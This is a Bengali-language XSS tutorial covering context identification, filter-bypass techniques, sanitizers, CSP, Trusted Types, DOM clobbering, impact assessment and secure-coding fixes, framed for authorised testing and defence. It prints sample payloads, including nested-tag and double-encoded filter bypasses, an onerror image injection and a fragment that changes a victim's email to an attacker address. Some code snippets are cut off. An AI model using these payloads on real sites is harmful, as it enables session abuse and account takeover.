<button onclick="search(''-alert(1)-'')">খুঁজুন</button>

  expression-এর অংশ হিসেবে alert(1) বসানো হয়েছে।

    Browser Inspector ব্যবহার করে Context যাচাই

    Chrome/Firefox DevTools-এর Elements প্যানেলে marker সার্চ করে দেখুন সেটি কোন DOM node-এর ভেতরে আছে — Elements panel প্রকৃত rendered DOM দেখায়, যা raw source থেকে কিছুটা ভিন্ন হতে পারে (ব্রাউজার malformed HTML কে auto-correct করে ফেলে)। তাই raw response (View Source / Network tab) ও rendered DOM — দুটোই পরীক্ষা করা ভালো অভ্যাস।

    Source-to-Sink Tracing (DOM-based context-এর জন্য)

    DOM-based XSS-এর ক্ষেত্রে marker পাঠানো যথেষ্ট না, কারণ সার্ভার response-এ কিছু দেখা যাবে না। এখানে করণীয়:

    1. পেজের JavaScript সোর্স (DevTools-এর Sources প্যানেল) খুলুন।
    2. location, document.URL, document.referrer, window.name ইত্যাদি কোথায় পড়া হচ্ছে তা খুঁজুন (এগুলো সম্ভাব্য source)।
    3. সেই ভ্যারিয়েবল কোথায় ব্যবহৃত হচ্ছে তা অনুসরণ করুন — বিশেষ করে innerHTML, document.write(), eval()-এর মতো sink-এ পৌঁছায় কি না দেখুন।
    4. DevTools-এর "Add breakpoint" ফিচার (DOM mutation breakpoint বা XHR breakpoint) ব্যবহার করে কোন কোড চলছে তা ধাপে ধাপে অনুসরণ করুন।

    অধ্যায় ৭-এ Burp Suite-এর DOM Invader এক্সটেনশন এই কাজ অনেকটা স্বয়ংক্রিয় করে দেয়, তা দেখানো হয়েছে।

    সাধারণ ভুল (Common Mistakes)

    • Rendered DOM-কে raw response ভাবা: ব্রাউজার malformed HTML normalize করে ফেলে, তাই Elements panel সবসময় প্রকৃত server response প্রতিফলিত করে না।
    • একটি payload সব জায়গায় চেষ্টা করা: context না বুঝে একই <script> পেলোড বারবার পাঠানো অধিকাংশ ক্ষেত্রে ব্যর্থ হবে এবং সময় নষ্ট করবে।
    • Case-sensitivity ভুলে যাওয়া: HTML attribute/tag নাম case-insensitive হলেও, JavaScript ভ্যারিয়েবল নাম/স্ট্রিং case-sensitive।
    • শুধু প্রথম reflection দেখে থেমে যাওয়া: একই input একাধিক জায়গায় (একাধিক context-এ) প্রতিফলিত হতে পারে — সবগুলো যাচাই করা উচিত।

    অনুশীলন

    নিচের raw HTML response-এ marker-এর অবস্থান দেখে context চিহ্নিত করুন এবং একটি উপযুক্ত payload প্রস্তাব করুন:

    <script>
  var greeting = 'zzXSSmarker12345zz';
  document.getElementById('g').textContent = greeting;
</script>

    ইঙ্গিত: এখানে sink (textContent) ও context — দুটোই বিবেচনা করুন।

    সারসংক্ষেপ

    Context identification হলো unique marker দিয়ে reflection point খুঁজে বের করা, raw response-এ তার আশেপাশের syntax বিশ্লেষণ করা, এবং সেই অনুযায়ী payload নির্বাচন করা। DOM-based ক্ষেত্রে এর বদলে source-to-sink tracing প্রয়োজন। ভুল context ধরে নেওয়া সবচেয়ে সাধারণ এবং সময়-অপচয়কারী ভুল।

    Encoding, Sanitization and Filter Bypass

    কেন encoding কাজ করে, filter-এর সীমাবদ্ধতা কোথায়, এবং defensive দৃষ্টিকোণ থেকে এসব প্যাটার্ন বোঝা কেন গুরুত্বপূর্ণ।

    ⚖️

    আইনি নোটিশ: এই অধ্যায়ের bypass-সংক্রান্ত আলোচনা defensive/analytical উদ্দেশ্যে — যাতে আপনি নিজের বা অনুমোদিত অ্যাপ্লিকেশনের filter-এর দুর্বলতা বুঝে তা ঠিক করতে পারেন। অনুমতি ছাড়া কোনো সিস্টেমে প্রয়োগ নিষিদ্ধ।

    HTML Entity Encoding

    HTML entity encoding বিশেষ ক্যারেক্টারকে তাদের "টেক্সট প্রতিনিধি" রূপে রূপান্তরিত করে, যাতে ব্রাউজার সেগুলোকে markup হিসেবে নয়, শুধু প্রদর্শনযোগ্য টেক্সট হিসেবে treat করে।

    CharacterHTML Entity
    <&lt;
    >&gt;
    "&quot; / &#34;
    '&#39; / &apos;
    &&amp;

    সঠিকভাবে প্রয়োগ করলে HTML text context-এ এটি প্রায় সম্পূর্ণ সুরক্ষা দেয় — কারণ </> encode হয়ে গেলে নতুন ট্যাগ তৈরিই সম্ভব হয় না। কিন্তু মনে রাখা জরুরি: এই এনকোডিং শুধু HTML text context-এর জন্য উপযুক্ত — attribute, JS string বা URL context-এ একই এনকোডিং যথেষ্ট না হতে পারে।

    JavaScript Escaping

    JavaScript string literal-এর ভেতরে বিশেষ ক্যারেক্টার escape করতে হয় ব্যাকস্ল্যাশ দিয়ে — যেমন " → \", ' → \', newline → \n। তবে, শুধু JS escaping যথেষ্ট না যদি ডেটা পরে HTML-এও বসে — কারণ JS escaping </>-কে প্রভাবিত করে না, এবং যদি সেই string পরবর্তীতে innerHTML-এ ব্যবহৃত হয়, HTML injection সম্ভব থেকে যায়। এই কারণেই "context-aware" encoding — অর্থাৎ ডেটা শেষ পর্যন্ত কোথায় ব্যবহৃত হচ্ছে তার সবগুলো স্তর বিবেচনা করে encode করা — এত গুরুত্বপূর্ণ।

    URL Encoding

    URL-এ বিশেষ ক্যারেক্টার percent-encoding (%XX) দিয়ে প্রকাশ করা হয় — যেমন স্পেস → %20, < → %3C। এটি মূলত URL-এর গঠন বজায় রাখার জন্য, নিরাপত্তার জন্য নয় — ব্রাউজার/সার্ভার decode করার পর সেই ভ্যালু আবার তার আসল রূপে ফিরে যায় এবং তখন HTML/JS context-এর নিয়মই প্রযোজ্য হয়।

    Unicode Interpretation

    ব্রাউজার বিভিন্ন Unicode representation (যেমন &#x3C; হিসেবে <, অথবা full-width ক্যারেক্টার) কে normalize করে ফেলতে পারে। যদি একটি sanitizer শুধু ASCII </> চেক করে, কিন্তু ব্রাউজার Unicode variant-কেও normalize করে চেনে, তাহলে একটি ফাঁক তৈরি হতে পারে। এটি এনকোডিং-ভিত্তিক filter bypass-এর একটি ক্লাসিক কারণ।

    Input Validation ও Output Encoding — পার্থক্য

    Input Validation

    ডেটা গ্রহণ করার সময় তার ফরম্যাট/গঠন যাচাই করা (যেমন ইমেইল ফিল্ডে শুধু ইমেইল-সদৃশ টেক্সট গ্রহণ করা)। এটি প্রথম স্তরের ফিল্টার, কিন্তু একমাত্র রক্ষাকবচ হিসেবে যথেষ্ট না — কারণ অনেক বৈধ input (যেমন নাম ফিল্ডে "O'Brien")-এ বিশেষ ক্যারেক্টার থাকতে পারে।

    Output Encoding

    ডেটা প্রদর্শনের সময়, সেই মুহূর্তের context অনুযায়ী এনকোড করা। এটিই XSS প্রতিরোধের মূল ও সবচেয়ে নির্ভরযোগ্য স্তর, কারণ এটি data কোথায় ব্যবহৃত হচ্ছে তার উপর ভিত্তি করে কাজ করে, input কেমন ছিল তার উপর নয়।

    Allowlist বনাম Blocklist

    পদ্ধতিকাজ করার ধরনসমস্যা/সুবিধা
    Blocklistনির্দিষ্ট "খারাপ" keyword/ক্যারেক্টার (যেমন <script>) বাদ দেওয়াসহজে bypass হয় — নতুন variant/encoding/case সবসময় মিস হয়ে যেতে পারে
    Allowlistশুধুমাত্র পূর্বনির্ধারিত "নিরাপদ" ট্যাগ/attribute/প্যাটার্ন অনুমোদন করা, বাকি সব বাদঅনেক বেশি নির্ভরযোগ্য — কারণ অজানা/নতুন bypass প্যাটার্নও ডিফল্টভাবে বাদ পড়ে যায়

    Rich-text input (যেমন একটি ব্লগ এডিটর) sanitize করার সময় সবসময় allowlist-ভিত্তিক পদ্ধতি (যেমন নির্দিষ্ট কয়েকটি ট্যাগ — b, i, a — এবং নির্দিষ্ট attribute শুধু অনুমোদন করা) ব্যবহার করা উচিত, কখনো blocklist না।

    Regex Filter-এর সীমাবদ্ধতা

    অনেক naive filter একটি regex দিয়ে <script.*?>-এর মতো প্যাটার্ন বাদ দেওয়ার চেষ্টা করে। এর কয়েকটি সাধারণ দুর্বলতা:

    • Case sensitivity ভুল: <ScRiPt> regex-টি case-insensitive না হলে পাস হয়ে যাবে।
    • নেস্টেড ট্যাগ: একটি naive filter যদি শুধু একবার <script> স্ট্রিপ করে, তাহলে <scr<script>ipt>-এর মতো ইনপুট (যেখানে ভেতরের <script> সরানোর পর বাইরের অংশ জোড়া লেগে আসল ট্যাগ তৈরি হয়ে যায়) bypass করতে পারে।
    • সীমিত keyword তালিকা: filter হয়তো script, onerror আটকায় কিন্তু onfocus, onanimationstart-এর মতো কম পরিচিত event বাদ দিতে ভুলে যায়।
    • শুধু নির্দিষ্ট ট্যাগ আটকানো: <script> আটকালেও <svg>, <math>, <iframe>-এর মতো বিকল্প vector বিবেচনা না করা।

    Filter rule (naive): remove the substring "<script>" once

Input:  <scr<script>ipt>alert(1)</scr<script>ipt>
After removing inner "<script>" once from each:
Result: <script>alert(1)</script>
→ ফিল্টার করার পরেও একটি সম্পূর্ণ, কার্যকর script ট্যাগ তৈরি হয়ে যায়।

    Double Encoding

    কখনো কখনো একটি অ্যাপ্লিকেশন input-কে একাধিকবার decode করে (যেমন URL-decode একবার framework-লেভেলে, আরেকবার application কোডে)। যদি filtering প্রথম decode-এর আগে/পরে ভুল পর্যায়ে বসানো হয়, তাহলে একটি double-encoded payload (%253Cscript%253E, যা decode হয়ে প্রথমে %3Cscript%3E এবং পরে <script> হয়) filter কে ফাঁকি দিতে পারে।

    Browser Parsing Differences

    বিভিন্ন ব্রাউজার (এবং একই ব্রাউজারের বিভিন্ন সংস্করণ) malformed বা অস্বাভাবিক HTML কে সামান্য ভিন্নভাবে parse/normalize করতে পারে। একটি filter যা একটি নির্দিষ্ট ব্রাউজারের আচরণ ধরে নিয়ে লেখা হয়েছে, অন্য ব্রাউজারে ভিন্ন ফলাফল দিতে পারে — এটিই mutation XSS (অধ্যায় ৩)-এর একটি মূল কারণ।

    DOMPurify-এর নিরাপদ ব্যবহার

    DOMPurify একটি সুপরিচিত, সক্রিয়ভাবে রক্ষণাবেক্ষণ করা open-source HTML sanitization লাইব্রেরি, যা allowlist-ভিত্তিক পদ্ধতিতে কাজ করে এবং পরিচিত mutation XSS প্যাটার্নের বিরুদ্ধে regularly টেস্ট করা হয়।

    সঠিক ব্যবহার
    // নিরাপদ: DOMPurify দিয়ে sanitize করার পরই innerHTML-এ বসানো
const clean = DOMPurify.sanitize(userSuppliedHTML);
element.innerHTML = clean;

// ভুল: sanitize করেও পুরনো/misconfigured ভার্সন ব্যবহার করা,
// অথবা sanitize করার পর আবার অন্য কোনো concatenation করা
    ⚠️

    নিজে regex দিয়ে sanitizer লেখা কখনো নিরাপদ বিকল্প নয় — HTML parsing এতটাই জটিল ও edge-case-নির্ভর যে শুধুমাত্র browser-grade, ব্যাপকভাবে পরীক্ষিত লাইব্রেরিই নির্ভরযোগ্য সুরক্ষা দিতে পারে।

    Burp Suite একটি intercepting proxy — ব্রাউজার ও সার্ভারের মাঝে বসে প্রতিটি HTTP request/response দেখা, থামানো এবং পরিবর্তন করার সুযোগ দেয়।

    3. Burp-এর CA সার্টিফিকেট ব্রাউজারে ইনস্টল করুন, যাতে HTTPS ট্রাফিকও ইন্টারসেপ্ট করা যায় (http://burp থেকে ডাউনলোড করা যায়)।
    4. শুধুমাত্র নিজের lab/অনুমোদিত target-এর ডোমেইনে স্কোপ সীমাবদ্ধ রাখুন (Target → Scope)।

    Browser DevTools

    Burp-এর পাশাপাশি ব্রাউজারের নিজস্ব DevTools (F12) অপরিহার্য:

    • Elements প্যানেল: rendered DOM দেখা, marker খুঁজে তার আশেপাশের structure পরীক্ষা করা।

    DOM Invader

    DOM Invader হলো Burp Suite-এর বিল্ট-ইন ব্রাউজারের একটি এক্সটেনশন, যা DOM-based XSS শনাক্ত করার জন্য বিশেষভাবে ডিজাইন করা। এটি পেজের সব source (location.hash, postMessage ইত্যাদি) এবং sink (innerHTML, eval ইত্যাদি) স্বয়ংক্রিয়ভাবে instrument করে, এবং canary value পাঠিয়ে কোন source থেকে কোন sink পর্যন্ত ডেটা পৌঁছাচ্ছে তা হাইলাইট করে দেখায় — ম্যানুয়াল source-to-sink tracing (অধ্যায় ৫)-এর কাজ অনেক দ্রুত করে দেয়।

    💡

    DOM Invader ব্যবহার করতে Burp-এর বিল্ট-ইন Chromium ব্রাউজার থেকে টার্গেট ভিজিট করুন, Burp-এর Settings → DOM Invader থেকে এটি enable করুন, তারপর পেজের সাথে স্বাভাবিকভাবে interact করুন — এটি background-এ source/sink ট্র্যাক করতে থাকবে।

  return <div>{text}</div>;
}

    গুরুত্বপূর্ণ সতর্কতা: "আমরা React/Vue ব্যবহার করি, তাই আমরা XSS থেকে নিরাপদ" — এটি একটি বিপজ্জনক ভুল ধারণা। যেকোনো জায়গায় একজন ডেভেলপার যদি সুবিধার জন্য escape hatch ব্যবহার করেন (প্রায়ই rich-text/markdown রেন্ডার করার জন্য), vulnerability ফিরে আসে।

    Content Security Policy (CSP)

    CSP একটি HTTP response header (Content-Security-Policy), যা ব্রাউজারকে নির্দেশ দেয় কোন কোন উৎস থেকে script/style/image লোড করা অনুমোদিত। সঠিকভাবে কনফিগার করা CSP অনেক XSS payload-কে execute হতে বাধা দেয়, এমনকি HTML injection ঘটলেও।

    CSP উদাহরণ
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example; object-src 'none'

→ এই নীতিতে: inline <script>alert(1)</script> execute হবে না
  (কারণ 'unsafe-inline' নেই), এবং শুধুমাত্র নিজের origin ও
  trusted-cdn.example থেকে external script লোড হবে।

    CSP-এর সাধারণ দুর্বলতা

    • unsafe-inline থাকা: এটি থাকলে inline script-এর বিরুদ্ধে CSP-এর প্রধান সুরক্ষাই অকার্যকর হয়ে যায়।
    • Overly broad script-src: যেমন script-src * বা একটি বিশ্বস্ত কিন্তু ব্যবহারকারী-আপলোডযোগ্য কনটেন্ট হোস্ট করা CDN allowlist-এ থাকা (JSONP endpoint-এর মাধ্যমে bypass সম্ভব হতে পারে)।
    • Nonce/hash পুনঃব্যবহার: যদি একটি nonce static/predictable হয়, attacker সেটি অনুমান/পুনঃব্যবহার করতে পারে।

    CSP কখনো একমাত্র প্রতিরক্ষা হিসেবে বিবেচনা করা উচিত না — এটি defense-in-depth-এর একটি স্তর, output encoding-এর বিকল্প নয়।

    Trusted Types

    Trusted Types একটি ব্রাউজার API (CSP-এর মাধ্যমে enable করা হয়), যা DOM XSS sink-গুলোকে (innerHTML, eval ইত্যাদি) raw string গ্রহণ করতে বাধা দেয় — শুধুমাত্র একটি নির্দিষ্ট, developer-নির্ধারিত "policy" দিয়ে তৈরি করা বিশেষ অবজেক্টই গ্রহণযোগ্য হয়। এটি মূলত DOM-based XSS-এর বিরুদ্ধে একটি architectural defense, যা sanitization ভুলে যাওয়ার মানবিক ভুল কমিয়ে দেয়।

    Trusted Types উদাহরণ (ধারণাগত)
    Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy;

const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput); // অনুমোদিত
element.innerHTML = userInput; // ব্রাউজার ব্লক করবে — raw string গ্রহণযোগ্য না

    Mutation XSS — পুনরালোচনা

    অধ্যায় ৩-এ mXSS-এর মৌলিক ধারণা দেখা হয়েছে। Advanced পর্যায়ে এর গবেষণা মূলত sanitizer-এর parse/serialize round-trip-এর সূক্ষ্ম আচরণ নিয়ে — যেমন নির্দিষ্ট namespace (SVG/MathML)-এর ভেতরে HTML ট্যাগ কীভাবে আচরণ করে তা বিভিন্ন ব্রাউজার ইঞ্জিনে আলাদা হতে পারে। Real-world mXSS গবেষণা সাধারণত browser engine source code ও sanitizer-এর টেস্ট স্যুট গভীরভাবে অধ্যয়ন করে করা হয় — এটি একটি উচ্চ-দক্ষতাসম্পন্ন, সময়সাপেক্ষ গবেষণা ক্ষেত্র।

    DOM Clobbering

    DOM clobbering একটি কৌশল যেখানে attacker নির্দিষ্ট id/name attribute-সহ HTML element তৈরি করে, যা JavaScript কোডের প্রত্যাশিত global variable বা object property-কে "ওভাররাইড" করে দেয় — বিশেষ করে যখন কোড অনুমান করে একটি নির্দিষ্ট ভ্যারিয়েবল সবসময় একটি নির্দিষ্ট টাইপের (যেমন ফাংশন বা কনফিগারেশন অবজেক্ট) হবে।

    ধারণাগত উদাহরণ
    // Vulnerable JS (অনুমান করে config সবসময় object):
if (window.config && window.config.isAdmin) { ... }

// Attacker-controlled HTML (যদি attacker সীমিত HTML injection করতে পারেন,
// কিন্তু <script> সরাসরি চালাতে না পারেন):
<form id="config"><input name="isAdmin" value="true"></form>

// এখন window.config একটি HTMLFormElement হয়ে যায়, এবং
// window.config.isAdmin সেই input-এর মান নির্দেশ করে — যা
// মূল কোডের লজিককে বিভ্রান্ত করতে পারে।

    এটি দেখায় যে এমনকি সীমিত HTML injection (যেখানে সরাসরি script execution সম্ভব না) ও বিপজ্জনক হতে পারে, যদি client-side কোড global namespace-এর উপর ভুলভাবে নির্ভর করে।

    Browser Compatibility ও Sanitizer Differences

    Research-grade XSS কাজে এটি মনে রাখা জরুরি যে একই payload সব ব্রাউজারে একইভাবে আচরণ নাও করতে পারে — বিশেষ করে পুরনো vs. নতুন ব্রাউজার ইঞ্জিন, অথবা বিভিন্ন sanitizer লাইব্রেরি/সংস্করণ। একটি responsible disclosure/bug bounty report-এ কোন ব্রাউজার ও সংস্করণে টেস্ট করা হয়েছে তা স্পষ্টভাবে উল্লেখ করা উচিত (অধ্যায় ১২)।

    Root-Cause Analysis Framework

    একটি advanced XSS finding-এর জন্য শুধু "এটি কাজ করে" বলা যথেষ্ট না — root cause বিশ্লেষণে অন্তর্ভুক্ত থাকা উচিত:

    1. Data flow: ঠিক কোন source থেকে ডেটা এসেছে এবং কোন sink পর্যন্ত পৌঁছেছে।
    2. Missing control: কোন নির্দিষ্ট স্তরে encoding/sanitization অনুপস্থিত বা ভুলভাবে প্রয়োগ করা হয়েছে।
    3. Contributing factors: framework misuse, CSP misconfiguration, বা parser differences কি ভূমিকা রেখেছে।
    4. নির্দিষ্ট, কার্যকর fix প্রস্তাব — শুধু "input sanitize করুন" না বলে, ঠিক কোন স্তরে কোন পরিবর্তন প্রয়োজন তা স্পষ্টভাবে বলা।

    অনুশীলন

    একটি অ্যাপ্লিকেশনে React ব্যবহার হচ্ছে, কিন্তু একটি markdown-রেন্ডারিং কম্পোনেন্ট dangerouslySetInnerHTML দিয়ে markdown-কে HTML-এ রূপান্তরিত করে দেখাচ্ছে, কোনো sanitization ছাড়াই। এই পরিস্থিতির জন্য root-cause analysis framework অনুসরণ করে একটি সংক্ষিপ্ত বিশ্লেষণ লিখুন।

    সারসংক্ষেপ

    আধুনিক ফ্রেমওয়ার্ক ডিফল্ট auto-escaping দিয়ে অনেক XSS প্রতিরোধ করে, কিন্তু escape hatch API-গুলোই আধুনিক XSS-এর প্রধান উৎস। CSP ও Trusted Types defense-in-depth স্তর হিসেবে শক্তিশালী, কিন্তু output encoding-এর বিকল্প নয়। DOM clobbering ও mutation XSS দেখায় যে সীমিত HTML injection-ও বিপজ্জনক হতে পারে।

    Single-Page Applications (SPA)

    SPA-তে পুরো অ্যাপ্লিকেশন একটিমাত্র HTML পেজ লোড করে, এবং বাকি সব navigation/rendering client-side JavaScript দিয়ে হয়। এর ফলে প্রায় সব data rendering DOM-based context-এ ঘটে — অর্থাৎ অধ্যায় ৩-এর DOM-based XSS প্যাটার্ন SPA-তে সবচেয়ে বেশি প্রাসঙ্গিক। Client-side router (যেমন URL hash বা History API দিয়ে route নির্ধারণ) নিজেই একটি সাধারণ source, যদি route parameter সরাসরি কোনো sink-এ ব্যবহৃত হয়।

    REST API ও JSON Rendering

    আধুনিক অ্যাপ প্রায়ই backend থেকে JSON ডেটা নিয়ে client-side-এ render করে। একটি সাধারণ ভুল ধারণা — "JSON নিরাপদ কারণ এটি HTML না"। কিন্তু JSON-এর ভেতরের স্ট্রিং মান, client-side কোডে কীভাবে ব্যবহৃত হচ্ছে তার উপর নির্ভর করে ঠিক ততটাই বিপজ্জনক হতে পারে, যদি সেই মান পরে innerHTML-এ বসানো হয়।

    উদাহরণ
    // API response:
{"username": "<img src=x onerror=alert(1)>"}

// Client-side কোড (vulnerable):
fetch('/api/profile').then(r => r.json()).then(data => {
  document.getElementById('name').innerHTML = data.username; // ❌
});

    Search Result Rendering

    সার্চ ফিচারে প্রায়ই ইউজারের সার্চ টার্ম "হাইলাইট" করার জন্য প্রোগ্রামেটিকভাবে HTML তৈরি করা হয় (যেমন matched অংশ <mark> ট্যাগে মোড়ানো)। যদি এই হাইলাইটিং লজিক সরাসরি string concatenation/innerHTML ব্যবহার করে, এবং সার্চ টার্মে নিজে HTML থাকে, একটি দ্বিতীয় স্তরের injection ঘটতে পারে।

    প্রোফাইল, কমেন্ট ও রিভিউ

    এই ক্লাসিক stored XSS vector গুলো এখনও সমানভাবে প্রাসঙ্গিক — বিশেষ করে যখন bio/display name-এর মতো ফিল্ড একাধিক জায়গায় (প্রোফাইল পেজ, কমেন্ট লিস্ট, নোটিফিকেশন, অ্যাডমিন ইউজার-লিস্ট) আলাদা আলাদা কোড দিয়ে রেন্ডার হয় — প্রতিটি জায়গার encoding আলাদাভাবে যাচাই করা প্রয়োজন, কারণ একটি জায়গায় ফিক্স থাকলেও অন্য জায়গায় না-ও থাকতে পারে।

    Messaging Applications

    রিয়েল-টাইম মেসেজিং অ্যাপ (WebSocket-ভিত্তিক) প্রায়ই দ্রুত development-এর কারণে output encoding মিস করে। এছাড়া, message preview/notification (যেমন ব্রাউজার পুশ নোটিফিকেশন বা অন্য একটি UI কম্পোনেন্ট যা মেসেজ কনটেন্ট দেখায়) আলাদাভাবে রেন্ডার হতে পারে, এবং সেই দ্বিতীয় রেন্ডারিং পাথ প্রায়ই মূল চ্যাট উইন্ডোর মতো যত্ন সহকারে sanitize করা হয় না।

    Markdown ও Rich-Text Editor

    Markdown-কে HTML-এ রূপান্তর করা একটি ক্লাসিক উচ্চ-ঝুঁকিপূর্ণ এলাকা — কারণ markdown নিজে HTML tag পাস-থ্রু করার অনুমতি দেয়, এবং markdown parser প্রায়ই রূপান্তরের পর নিজে sanitize করে না। নিয়ম: markdown parser-এর আউটপুটকে সবসময় raw, untrusted HTML হিসেবে বিবেচনা করুন এবং পরে আলাদাভাবে DOMPurify দিয়ে sanitize করুন।

    File Metadata

    File upload ফিচারে ফাইলের নাম, EXIF ডেটা (ছবির মেটাডেটা), বা SVG ফাইলের ভেতরের কনটেন্ট (SVG নিজেই একটি XML/HTML-সদৃশ ফরম্যাট, যার ভেতরে <script> থাকতে পারে) প্রায়ই একটি ভুলে যাওয়া XSS vector। একটি আপলোড করা SVG ফাইল সরাসরি <img> ট্যাগে না দেখিয়ে browser-এ সরাসরি খোলার লিঙ্ক দিলে, SVG-এর ভেতরের script execute হতে পারে।

    Admin Dashboard

    Admin panel প্রায়ই সবচেয়ে কম পরীক্ষিত অংশ, কারণ developer ধরে নেন "শুধু বিশ্বস্ত admin-রা এটি দেখেন"। কিন্তু admin dashboard প্রায়ই সাধারণ ইউজারদের জমা দেওয়া ডেটা (সাপোর্ট টিকিট, রিপোর্ট করা কনটেন্ট, ইউজার তালিকা) প্রদর্শন করে — এটিই blind XSS (অধ্যায় ৩)-এর সবচেয়ে সাধারণ টার্গেট, এবং impact-ও সবচেয়ে বেশি কারণ admin-এর privilege সবচেয়ে উঁচু।

    Client-Side Routing

    SPA router-এ route parameter (যেমন /user/:id) থেকে ডেটা নিয়ে সরাসরি পেজ টাইটেল বা breadcrumb-এ বসানো একটি সাধারণ DOM-based XSS উৎস, বিশেষ করে যখন framework-এর auto-escaping এড়িয়ে ম্যানুয়ালি DOM manipulate করা হয়।

    Third-Party Widgets

    Chat widget, analytics script, advertisement iframe-এর মতো third-party ইন্টিগ্রেশন নিজেরাই XSS-এর উৎস হতে পারে, অথবা তাদের configuration (যেমন একটি widget-কে পাঠানো ইউজারনেম) যদি sanitize না করা ডেটা বহন করে। এছাড়া, postMessage-ভিত্তিক communication-এ যদি origin যাচাই না করা হয়, একটি দূষিত iframe/উইন্ডো থেকে বার্তা গ্রহণ করে তা কোনো sink-এ বসানো একটি আধুনিক DOM-based XSS প্যাটার্ন।

    XSS Impact and Risk Assessment

    একটি XSS finding-এর প্রকৃত severity কীভাবে নির্ধারণ করবেন — শুধু "execute হয়েছে" বলার বাইরে গিয়ে প্রমাণ-ভিত্তিক মূল্যায়ন।

    ⚖️

    আইনি নোটিশ: Impact যাচাইয়ের সময়ও সবসময় harmless proof-of-execution (alert) ব্যবহার করুন — বাস্তব ডেটা এক্সফিল্ট্রেশন/অ্যাকাউন্ট পরিবর্তনের মাধ্যমে impact "প্রমাণ" করার প্রয়োজন নেই এবং তা destructive।

    Confidentiality, Integrity ও Availability (CIA)

    Confidentiality

    সেশন কুকি, ব্যক্তিগত ডেটা, API টোকেন চুরি হওয়ার সম্ভাবনা।

    Integrity

    ভিকটিমের সেশন ব্যবহার করে ডেটা/সেটিংস পরিবর্তন (যেমন ইমেইল পরিবর্তন, পোস্ট করা)।

    Availability

    সাধারণত কম প্রাসঙ্গিক, তবে defacement বা ক্রমাগত ক্ষতিকর redirect সার্ভিস ব্যবহারযোগ্যতা ব্যাহত করতে পারে।

    User Privilege ও Affected Users

    একটি XSS-এর severity সরাসরি নির্ভর করে — কাকে আক্রমণ করা সম্ভব তার উপর। একটি reflected XSS যা শুধুমাত্র নিজের অ্যাকাউন্টে কাজ করে (self-XSS) তা সাধারণত কম গুরুত্বপূর্ণ, কারণ ভিকটিমকে নিজেই নিজের বিরুদ্ধে payload চালাতে রাজি করাতে হবে — যা বাস্তবসম্মত attack scenario হিসেবে দুর্বল। অন্যদিকে, একটি stored XSS যা admin panel-এ দেখা যায়, সর্বোচ্চ severity পায়, কারণ এটি যেকোনো সাধারণ ইউজার থেকে admin privilege পর্যন্ত escalate করতে পারে।

    Stored XSS-এর ঝুঁকি কেন বেশি

    Stored XSS-এর impact reflected-এর চেয়ে বেশি কারণ: (১) কোনো social engineering/বিশেষ লিঙ্কে ক্লিক করানোর প্রয়োজন নেই — ভিকটিম স্বাভাবিকভাবে পেজ ভিজিট করলেই আক্রান্ত হয়, (২) একাধিক ভিকটিমকে একসাথে প্রভাবিত করতে পারে, এবং (৩) persist করে — একবার fix না হওয়া পর্যন্ত বারবার trigger হতে থাকে।

    Session Security ও HttpOnly Cookies

    যদি session cookie HttpOnly flag দিয়ে সেট করা থাকে, JavaScript (document.cookie) দিয়ে সেই cookie পড়া সম্ভব হয় না — এটি XSS-এর মাধ্যমে সরাসরি session token চুরির ঝুঁকি উল্লেখযোগ্যভাবে কমায়। তবে এটি XSS-কে সম্পূর্ণ নিরাপদ করে না — attacker তখনও ভিকটিমের ব্রাউজারের মধ্যে থেকে সরাসরি authenticated API কল করতে পারে (cookie পড়তে না পারলেও, ব্রাউজার automatically সেই cookie attach করবে একই origin-এর request-এ)।

    HttpOnly থাকা সত্ত্বেও সম্ভাব্য impact

// সরাসরি action চালানো এখনও সম্ভব:

  body: JSON.stringify({email: 'attacker@evil.example'})
});

    CSP-এর সীমাবদ্ধতা Impact মূল্যায়নে

    একটি সক্রিয় CSP থাকলে সেটি XSS-এর কার্যকারিতা সীমিত করতে পারে, কিন্তু severity assessment-এ CSP-কে পুরোপুরি "mitigated" হিসেবে ধরে নেওয়া উচিত না — কারণ CSP bypass প্রায়ই সম্ভব হয় (অধ্যায় ৮), এবং অনেক CSP policy-তে ফাঁক থাকে। Severity নির্ধারণের সময় CSP-এর উপস্থিতি নোট করা উচিত, কিন্তু vulnerability-কে সম্পূর্ণভাবে non-issue বলে বাতিল করা উচিত না, যদি না bypass অসম্ভব বলে যাচাই করা হয়।

    CVSS-এর প্রাসঙ্গিকতা

    CVSS (Common Vulnerability Scoring System) XSS-এর জন্যও ব্যবহৃত হয়, বিশেষ করে attack vector (Network), attack complexity, privileges required, user interaction প্রয়োজন কি না, এবং scope (vulnerability কি শুধু ভিকটিমের ডেটা প্রভাবিত করে নাকি অন্য security scope-এও ছড়ায়) বিবেচনা করে। একটি unauthenticated stored XSS যা admin-কে প্রভাবিত করে, সাধারণত High-Critical রেঞ্জে পড়ে; একটি self-XSS সাধারণত খুবই কম স্কোর পায় বা bug-bounty প্রোগ্রাম সেটিকে "Not Applicable/Informative" হিসেবে গণ্য করে। প্রকৃত স্কোরের জন্য official CVSS calculator ব্যবহার করা উচিত।

    Framework-Specific Defenses — সংক্ষিপ্ত চেকলিস্ট

    পূর্ণাঙ্গ before/after (Node.js + Express)
    // ❌ BEFORE — vulnerable

  const name = req.query.name;
  res.send(`<h1>স্বাগতম, ${name}</h1>`);
});

// ✅ AFTER — fixed
const escapeHtml = require('escape-html');
app.get('/greet', (req, res) => {
  const name = escapeHtml(req.query.name || '');
  res.send(`<h1>স্বাগতম, ${name}</h1>`);
});

// ✅✅ আরও ভালো — templating engine-এর ডিফল্ট auto-escape ব্যবহার করা
app.get('/greet', (req, res) => {
  res.render('greet', { name: req.query.name || '' }); // EJS <%= %> auto-escapes
});

    Secure Coding চেকলিস্ট

    • ☑ Output encoding সবসময় context-aware এবং output-time-এ করা হচ্ছে।
    • ☑ innerHTML/document.write()/eval() ব্যবহার হলে তার প্রতিটি instance review করা হয়েছে।
    • ☑ Rich HTML প্রয়োজন হলে, allowlist-ভিত্তিক sanitizer (DOMPurify) ব্যবহার করা হচ্ছে।
    • ☑ Framework-এর escape hatch API-গুলো ন্যূনতম এবং ন্যায্যতাসহ ব্যবহৃত হচ্ছে।
    • ☑ CSP প্রয়োগ করা আছে (nonce-based, unsafe-inline ছাড়া)।
    • ☑ Session cookie-তে HttpOnly, Secure, SameSite সেট করা আছে।
